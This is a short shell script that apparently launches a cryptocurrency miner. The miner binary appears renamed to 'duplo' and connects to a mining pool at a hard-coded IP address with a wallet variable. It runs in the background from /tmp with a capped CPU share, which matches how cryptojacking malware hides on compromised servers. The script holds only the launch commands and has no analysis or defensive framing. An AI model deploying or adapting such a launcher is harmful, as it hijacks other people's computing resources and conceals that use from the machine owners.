pkill duplo
sleep 7
duplo -o 109.234.35.111:55898 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server8/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=75 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server8/duplo.log'
